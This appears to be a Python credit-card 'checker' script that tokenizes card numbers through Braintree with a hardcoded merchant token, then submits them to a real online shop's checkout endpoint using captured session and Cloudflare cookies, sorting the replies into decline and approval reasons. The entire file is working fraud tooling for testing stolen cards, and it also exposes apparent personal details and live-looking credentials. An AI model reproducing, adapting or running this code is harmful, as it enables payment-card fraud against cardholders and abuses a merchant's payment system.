import requests
import time
def Tele(cx):
	cc = cx.split("|")[0]
	mes = cx.split("|")[1]
	ano = cx.split("|")[2]
	cvv = cx.split("|")[3]
	if "20" in ano:
		ano = ano.split("20")[1]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjkxMTAxNzcsImp0aSI6ImJmZDhiNDYwLWMxMDEtNDYzYi05ZGNjLWM3ODZkZGFkMTU0YSIsInN1YiI6ImRodzU3bWhtd2ozbXpibjciLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRodzU3bWhtd2ozbXpibjciLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.e87FQ_d0n2sDAK0wt5sBcPh6JziceNj_GP-kMUIaLPuoDeeXYQSiN4GsBX3FN1m8h45EVEBTv407ensZoFHsdw',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '478437d9-0989-4a93-a4bc-bee3257294be',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': cc,
	                'expirationMonth': mes,
	                'expirationYear': ano,
	                'cvv': cvv,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	token=response.json()['data']['tokenizeCreditCard']['token']

	cookies = {
	    'PHPSESSID': 'qp1c030r7nbop0gmqfptm6qbnlqmkhmv',
	    'PHPSESSID': 'qp1c030r7nbop0gmqfptm6qbnlqmkhmv',
	    '_gid': 'GA1.2.1308292599.1728984907',
	    'form_key': 'ke30eRsgNgeAZbBi',
	    'mage-cache-storage': '%7B%7D',
	    'mage-cache-storage-section-invalidation': '%7B%7D',
	    'mage-cache-sessid': 'true',
	    'recently_viewed_product': '%7B%7D',
	    'recently_viewed_product_previous': '%7B%7D',
	    'recently_compared_product': '%7B%7D',
	    'recently_compared_product_previous': '%7B%7D',
	    'product_data_storage': '%7B%7D',
	    'form_key': 'ke30eRsgNgeAZbBi',
	    'mage-messages': '',
	    '__cf_bm': 'KYWKuPEY.nNQ8WKoBo_NxC7GA0imfcYAETS0SOxuTYM-1729023645-1.0.1.1-a28UZCGLN4Md1YDhMel5Ek4KKDgNVTGw.wV88p0NZx4If.YeIEJdIg_S538_LBE5SRmC_DcRHvvZHE4soycGvg',
	    'cf_clearance': 'lpqTC7JFHj6yMU3Phth6cZGjPT.6cbLLK6xFk38VYI0-1729023658-1.2.1.1-lrcxzHzIeDGZAfjVJ30ypdq9J0QRLd1Im3i.9b5sKzG.LPRI1M.3OnNxDwiuEfchR.EcvJNAYNDJ4yfxRB1p6PBiEodhf1iuvZB.dFrIV5J4iSA0T.i5qqPmW35sdueXk5jrnz0d7eT4IerKYYgtz2PMpONSZ662a4EDWUVPc2jcN0nBPyjY2iULGTMn345A6_ovyLYN278fFdGohy6QkaI_iTuE1Z4xwrFbr43bnX7jKrXgewN5DeMukkha4S.Y9LRZ0_JzypICdX4mvvQ2a4GBNsjrXG6tCkVwlA5EANBtoLUP0SBNOh4HxRiQiSlMA1m8ZcAxK7BbTQlz6YcOaRYaDp04LIwIzG9Yp8T.Y7VaoxbrbPGqgkqL7dU2gP85',
	    '_ga_VS3FFF3K9S': 'GS1.1.1729027206.2.1.1729027334.3.0.0',
	    '_ga': 'GA1.2.1909453630.1728984907',
	    'private_content_version': '31a39ce601bddb4a47ef312ca32972eb',
	    'section_data_ids': '%7B%22cart%22%3A1729023780%2C%22directory-data%22%3A1729023670%2C%22captcha%22%3A1729023711%2C%22messages%22%3A1729023783%7D',
	}
	
	headers = {
	    'Accept': '*/*',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/json',
	    # 'Cookie': 'PHPSESSID=qp1c030r7nbop0gmqfptm6qbnlqmkhmv; PHPSESSID=qp1c030r7nbop0gmqfptm6qbnlqmkhmv; _gid=GA1.2.1308292599.1728984907; form_key=ke30eRsgNgeAZbBi; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=ke30eRsgNgeAZbBi; mage-messages=; __cf_bm=KYWKuPEY.nNQ8WKoBo_NxC7GA0imfcYAETS0SOxuTYM-1729023645-1.0.1.1-a28UZCGLN4Md1YDhMel5Ek4KKDgNVTGw.wV88p0NZx4If.YeIEJdIg_S538_LBE5SRmC_DcRHvvZHE4soycGvg; cf_clearance=lpqTC7JFHj6yMU3Phth6cZGjPT.6cbLLK6xFk38VYI0-1729023658-1.2.1.1-lrcxzHzIeDGZAfjVJ30ypdq9J0QRLd1Im3i.9b5sKzG.LPRI1M.3OnNxDwiuEfchR.EcvJNAYNDJ4yfxRB1p6PBiEodhf1iuvZB.dFrIV5J4iSA0T.i5qqPmW35sdueXk5jrnz0d7eT4IerKYYgtz2PMpONSZ662a4EDWUVPc2jcN0nBPyjY2iULGTMn345A6_ovyLYN278fFdGohy6QkaI_iTuE1Z4xwrFbr43bnX7jKrXgewN5DeMukkha4S.Y9LRZ0_JzypICdX4mvvQ2a4GBNsjrXG6tCkVwlA5EANBtoLUP0SBNOh4HxRiQiSlMA1m8ZcAxK7BbTQlz6YcOaRYaDp04LIwIzG9Yp8T.Y7VaoxbrbPGqgkqL7dU2gP85; _ga_VS3FFF3K9S=GS1.1.1729027206.2.1.1729027334.3.0.0; _ga=GA1.2.1909453630.1728984907; private_content_version=31a39ce601bddb4a47ef312ca32972eb; section_data_ids=%7B%22cart%22%3A1729023780%2C%22directory-data%22%3A1729023670%2C%22captcha%22%3A1729023711%2C%22messages%22%3A1729023783%7D',
	    'Origin': 'https://www.olystudio.com',
	    'Referer': 'https://www.olystudio.com/checkout/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	json_data = {
	    'cartId': 'sADlHtuQotb7TGJIUoacwCTY7FKvCEtr',
	    'billingAddress': {
	        'countryId': 'US',
	        'regionId': '43',
	        'regionCode': 'NY',
	        'region': 'New York',
	        'street': [
	            'New York',
	        ],
	        'company': 'Mohamed Hamdy',
	        'telephone': '5162582584',
	        'postcode': '10080',
	        'city': 'New York',
	        'firstname': 'Mohamed',
	        'lastname': 'Hamdy',
	        'saveInAddressBook': None,
	    },
	    'paymentMethod': {
	        'method': 'braintree',
	        'additional_data': {
	            'payment_method_nonce': token,
	            'device_data': '{"device_session_id":"1457a54012cb2e6cf6391767156a57ae","fraud_merchant_id":null,"correlation_id":"772fa45ebede5d70aec66a8b5239a146"}',
	        },
	        'extension_attributes': {
	            'agreement_ids': [
	                '1',
	                '2',
	            ],
	        },
	    },
	    'email': 'hafezg93@gmail.com',
	}
	
	req0 = requests.post(
	    'https://www.olystudio.com/rest/default/V1/guest-carts/sADlHtuQotb7TGJIUoacwCTY7FKvCEtr/payment-information',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	if "three_d_secure" in req0.text:
		return "three_d_secure"
	if "Declined - Call Issuer" in req0.text:
		return "Declined - Call Issuer"
	if "Insufficient Funds" in req0.text:
		return "Insufficient Funds"
	if "Cannot Authorize at this time (Policy)" in req0.text:
		return "Cannot Authorize at this time (Policy)"
	if "Expired Card" in req0.text:
		return "Expired Card"
	if "Cardholder's Activity Limit Exceeded" in req0.text:
		return "Cardholder's Activity Limit Exceeded"
	if "Closed Card" in req0.text:
		return "Closed Card"
	if "Card Not Activated" in req0.text:
		return "Card Not Activated"
	if "risk" in req0.text:
		return "RISK: Retry this BIN later."
	if "Processor Declined - Fraud Suspected" in req0.text:
		return "Processor Declined - Fraud Suspected"
	if "No Account" in req0.text:
		return "No Account"
	if "Card Issuer Declined CVV" in req0.text:
		return "Card Issuer Declined CVV"
	if "Do Not Honor" in req0.text:
		return "Do Not Honor"
	if "Processor Declined" in req0.text:
		return "Processor Declined"
	if "Cannot Authorize at this time (Life cycle)" in req0.text:
		return "Cannot Authorize at this time (Life cycle)"
	if "Limit Exceeded" in req0.text:
		return "Limit Exceeded"
	if "Call Issuer. Pick Up Card" in req0.text:
		return "Call Issuer. Pick Up Card"
	else:
		try:
			code = req0.json()['error']
			return code
		except:
			try:
				return req0.json()['error']
			except:
				return req0.text
